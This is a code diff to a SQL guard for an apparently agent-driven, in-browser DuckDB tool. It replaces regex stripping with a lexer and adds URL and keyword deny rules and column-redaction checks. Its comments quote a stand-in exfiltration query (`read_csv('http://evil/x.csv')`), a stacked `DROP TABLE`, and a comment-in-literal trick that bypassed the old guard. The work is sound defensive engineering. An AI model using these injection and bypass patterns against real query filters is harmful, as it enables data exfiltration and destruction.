@@ -130,6 +130,7 @@ export async function runStatement(sql: string): Promise<void> {
   }
 }
 
+
 /**
  * SQL guard — the trust boundary for every SQL fragment that originates from the
  * agent OR from a human typing into a filter / chart box. Nothing user- or
@@ -148,7 +149,7 @@ export async function runStatement(sql: string): Promise<void> {
  *     still reads "0 bytes out". These are blocked here AND at the engine level
  *     (`SET enable_external_access=false`, see `createDb`).
  *
- * The scan runs on a copy with string/identifier literals and comments
+ * The rules run against scan copies with comments and string/identifier literals
  * neutralized, so a column literally named `update_ts` or a value `'drop it'`
  * doesn't false-trip.
  */
@@ -157,54 +158,199 @@ const FORBIDDEN_TOKENS =
 
 const NETWORKISH = /(?:https?|s3|gcs|azure|r2|hf|ftp|file):\/\//i;
 
-const stripComments = (sql: string): string =>
-  sql.replace(/--[^\n]*/g, "").replace(/\/\*[\s\S]*?\*\//g, "");
+/** The three scan copies the rules run against, produced by one walk. */
+interface ScanCopies {
+  /** Comments blanked; string / identifier literals left INTACT. */
+  literalsIntact: string;
+  /** Comments blanked AND every literal emptied. */
+  neutralized: string;
+  /**
+   * Comments blanked, single- and dollar-quoted STRINGS emptied, double-quoted
+   * IDENTIFIERS kept verbatim.
+   *
+   * WHY A THIRD COPY EXISTS — do not "simplify" it away. The redaction guards
+   * need exactly this asymmetry and neither other copy has it:
+   *   - `neutralized` empties `"ssn"` to `""`, so a quoted redacted identifier
+   *     would sail through. Reusing it here would silently WEAKEN redaction.
+   *   - `literalsIntact` keeps `'dropped ssn from payroll'`, so an innocent row
+   *     value that merely mentions the column would false-trip. Redaction that
+   *     cries wolf gets switched off.
+   * A redacted column name is radioactive as an IDENTIFIER and inert as a
+   * VALUE, so the copy the redaction rules read drops values and keeps
+   * identifiers.
+   */
+  identifiersIntact: string;
+}
 
-const neutralizeStrings = (sql: string): string =>
-  sql
-    .replace(/'(?:[^']|'')*'/g, "''")
-    .replace(/"(?:[^"]|"")*"/g, '""')
-    .replace(/\$\$[\s\S]*?\$\$/g, "''");
+/**
+ * Single-pass lexer over a SQL fragment.
+ *
+ * WHY A LEXER AND NOT A CHAIN OF REGEXES: comments and string literals are
+ * mutually exclusive lexical states, so no ordering of independent passes gets
+ * both right. The previous guard stripped comments first and neutralized strings
+ * second, which meant a comment marker living inside a string literal
+ * (`note = 'a--'`) deleted the rest of the fragment from the *scan copy* while
+ * the original — carrying a `read_csv('http://evil/x.csv')` exfiltration, or a
+ * stacked `; DROP TABLE` — reached `conn.query()` untouched. Walking once with
+ * exactly one state active closes that whole class.
+ *
+ * The redaction guards below carried the identical defect one layer down and
+ * now read this same walk, through a third copy — see `identifiersIntact`.
+ *
+ * Comments are emitted as a single space rather than deleted, because DuckDB's
+ * own lexer replaces a comment with whitespace: a comment between two identifier
+ * characters separates two tokens there, and must separate them here too.
+ *
+ * Anything the walk cannot close — an open string, an open block comment —
+ * throws. Failing closed is the only safe answer: we cannot know what DuckDB
+ * would make of it.
+ */
+function scanCopies(sql: string): ScanCopies {
+  let literalsIntact = "";
+  let neutralized = "";
+  let identifiersIntact = "";
+  let i = 0;
+  const n = sql.length;
 
-function assertNoAbuse(fragment: string): string {
+  const unterminated = (what: string): Error =>
+    new Error(
+      `Unterminated ${what} in that SQL — it can't be checked safely, so it is refused.`
+    );
+
+  while (i < n) {
+    const ch = sql[i];
+    const pair = sql.slice(i, i + 2);
+
+    // `--` line comment: runs to the newline, which stays as plain text.
+    if (pair === "--") {
+      const nl = sql.indexOf("\n", i);
+      i = nl === -1 ? n : nl;
+      literalsIntact += " ";
+      neutralized += " ";
+      identifiersIntact += " ";
+      continue;
+    }
+
+    // Block comment. DuckDB NESTS these, so count depth instead of stopping at
+    // the first close marker.
+    if (pair === "/*") {
+      let depth = 0;
+      while (i < n) {
+        const p = sql.slice(i, i + 2);
+        if (p === "/*") {
+          depth++;
+          i += 2;
+        } else if (p === "*/") {
+          depth--;
+          i += 2;
+          if (depth === 0) break;
+        } else {
+          i++;
+        }
+      }
+      if (depth !== 0) throw unterminated("block comment");
+      literalsIntact += " ";
+      neutralized += " ";
+      identifiersIntact += " ";
+      continue;
+    }
+
+    // Quoted string / quoted identifier, doubled quote escapes. Kept verbatim in
+    // `literalsIntact` so the URL rule can still see `read_csv('https://…')`.
+    if (ch === "'" || ch === '"') {
+      const start = i;
+      i++;
+      let closed = false;
+      while (i < n) {
+        if (sql[i] === ch) {
+          if (sql[i + 1] === ch) {
+            i += 2; // doubled quote — an escaped quote, not the end
+            continue;
+          }
+          i++;
+          closed = true;
+          break;
+        }
+        i++;
+      }
+      if (!closed) {
+        throw unterminated(ch === "'" ? "string literal" : "quoted identifier");
+      }
+      literalsIntact += sql.slice(start, i);
+      neutralized += ch === "'" ? "''" : '""';
+      // The asymmetry the redaction guards depend on: a string VALUE is dropped,
+      // a quoted IDENTIFIER survives so `"ssn"` is still caught.
+      identifiersIntact += ch === "'" ? "''" : sql.slice(start, i);
+      continue;
+    }
+
+    // Dollar-quoted string, `$$…$$` or `$tag$…$tag$`. Requiring a well-formed
+    // opening tag keeps DuckDB's positional parameters (`$1`, `$name`) out of
+    // this branch.
+    if (ch === "$") {
+      const open = /^\$(?:[A-Za-z_][A-Za-z0-9_]*)?\$/.exec(sql.slice(i));
+      if (open) {
+        const tag = open[0];
+        const end = sql.indexOf(tag, i + tag.length);
+        if (end === -1) throw unterminated("dollar-quoted string");
+        literalsIntact += sql.slice(i, end + tag.length);
+        neutralized += "''";
+        identifiersIntact += "''";
+        i = end + tag.length;
+        continue;
+      }
+    }
+
+    literalsIntact += ch;
+    neutralized += ch;
+    identifiersIntact += ch;
+    i++;
+  }
+
+  return { literalsIntact, neutralized, identifiersIntact };
+}
+
+/** Trim, lex once, and apply the mutation / stacking / network rules. */
+function assertNoAbuse(fragment: string): { trimmed: string; scan: ScanCopies } {
   const trimmed = fragment.trim().replace(/;\s*$/, "");
   if (!trimmed) throw new Error("Empty SQL.");
 
-  const noComments = stripComments(trimmed);
+  const scan = scanCopies(trimmed);
 
-  // `;` check on a string-neutralized copy so a value like 'a; b' doesn't trip.
-  if (neutralizeStrings(noComments).includes(";")) {
+  // `;` check on the neutralized copy so a value like 'a; b' doesn't trip.
+  if (scan.neutralized.includes(";")) {
     throw new Error(
       "Multiple statements are not allowed — remove the ';' and anything after it."
     );
   }
 
-  // Keyword / URL / file-reader check runs on the copy that STILL HAS string
-  // literals AND comments, so `read_csv('https://…')`, a bare
-  // `FROM 'https://…'` replacement scan, and a URL hidden only in a `--` or
-  // `/* */` comment are all visible. A filter that legitimately compares
-  // against a literal URL (or a comment that merely mentions one) is rejected
-  // too — deliberately: keeping data local is the whole point, and the error
-  // message is explicit.
-  if (NETWORKISH.test(trimmed)) {
+  // The URL check runs on the copy that STILL HAS string literals, so
+  // `read_csv('https://…')` and a bare `FROM 'https://…'` replacement scan are
+  // both visible. A filter that legitimately compares against a literal URL is
+  // rejected too — deliberately: keeping data local is the whole point, and the
+  // error message is explicit.
+  if (NETWORKISH.test(scan.literalsIntact)) {
     throw new Error(
       "Remote URLs are not allowed in a query — the data must stay in this browser."
     );
   }
-  if (FORBIDDEN_TOKENS.test(neutralizeStrings(noComments))) {
+  if (FORBIDDEN_TOKENS.test(scan.neutralized)) {
     throw new Error(
       "That SQL uses a keyword or function that isn't allowed here (no writes, " +
         "no file/URL readers). Use a staged propose_* tool to change the dataset."
     );
   }
-  return trimmed;
+  return { trimmed, scan };
 }
 
 /** A full statement fed to `run_sql` / chart SQL — must be a lone read query. */
 export function assertSelectOnly(sql: string): string {
-  const trimmed = assertNoAbuse(sql);
-  const scan = neutralizeStrings(stripComments(trimmed));
-  if (!/^\s*(select|with|values|explain|table|from|pivot|unpivot)\b/i.test(scan)) {
+  const { trimmed, scan } = assertNoAbuse(sql);
+  if (
+    !/^\s*(select|with|values|explain|table|from|pivot|unpivot)\b/i.test(
+      scan.neutralized
+    )
+  ) {
     throw new Error(
       "Only read queries are allowed here (SELECT / WITH / VALUES / EXPLAIN). " +
         "To change the dataset, use a staged tool such as propose_add_filter."
@@ -219,7 +365,7 @@ export function assertSelectOnly(sql: string): string {
  * statements, and network readers are not.
  */
 export function assertExpression(expr: string): string {
-  return assertNoAbuse(expr);
+  return assertNoAbuse(expr).trimmed;
 }
 
 /** A bare column identifier (join keys). Letters, digits, underscore only. */
@@ -245,10 +391,16 @@ const escapeRegExp = (s: string): string => s.replace(/[.*+?^${}()|[\]\\]/g, "\\
  * reconstructs one row, GROUP BY differencing peels values off one at a time.
  * So once a column is redacted its name is radioactive and may appear nowhere.
  *
- * Comments and single-quoted string literals are neutralized first so a row
- * value or a note that merely contains the word ("dropped from payroll") does
- * not false-trip. Double quotes are KEPT so a quoted identifier `"ssn"` is
- * still caught.
+ * Runs against `scanCopies().identifiersIntact` — comments blanked, string
+ * values emptied, quoted identifiers verbatim — so a note that merely contains
+ * the word ("dropped ssn from payroll") does not false-trip while a quoted
+ * `"ssn"` is still caught. It reads the SAME single-pass lexer as the abuse
+ * guard, deliberately: this guard used to strip comments with one regex and
+ * neutralize string literals with another, so a marker inside a literal
+ * (`WHERE note = '--' AND y = ssn`) erased the rest of the fragment from the
+ * scan copy while the original — still naming the blindfolded column — reached
+ * DuckDB. Two independent passes cannot get mutually exclusive lexical states
+ * right; one walk can.
  */
 export function assertNoRedactedColumns(
   sql: string,
@@ -256,7 +408,9 @@ export function assertNoRedactedColumns(
 ): string {
   const trimmed = sql.trim();
   if (redacted.length === 0) return trimmed;
-  const scan = ` ${stripComments(trimmed).replace(/'(?:[^']|'')*'/g, "''")} `;
+  // An unlexable fragment (unterminated quote or comment) throws out of
+  // `scanCopies` — fail closed, since we cannot know what DuckDB would read.
+  const scan = ` ${scanCopies(trimmed).identifiersIntact} `;
   for (const col of redacted) {
     // Manual identifier boundaries (a column name can contain spaces/hyphens),
     // optional surrounding double-quotes.
@@ -291,9 +445,13 @@ export function assertNoStarProjection(
   const trimmed = sql.trim();
   if (redacted.length === 0) return trimmed;
   const names = redacted.map((r) => `"${r}"`).join(", ");
-  const scan = stripComments(trimmed)
-    .replace(/'(?:[^']|'')*'/g, "''")
-    .replace(/\bcount\s*\(\s*\*\s*\)/gi, "count(0)");
+  // Same lexer-backed copy as `assertNoRedactedColumns`, for the same reason:
+  // a `--` or `/*` inside a string literal must not delete a `SELECT *` from
+  // the scan. `count(*)` is rewritten after lexing so it is not read as a star.
+  const scan = scanCopies(trimmed).identifiersIntact.replace(
+    /\bcount\s*\(\s*\*\s*\)/gi,
+    "count(0)"
+  );
   // `SUMMARIZE` reports min/max/quartiles/etc for EVERY column — real cell values.
   if (/\bsummarize\b/i.test(scan)) {
     throw new Error(
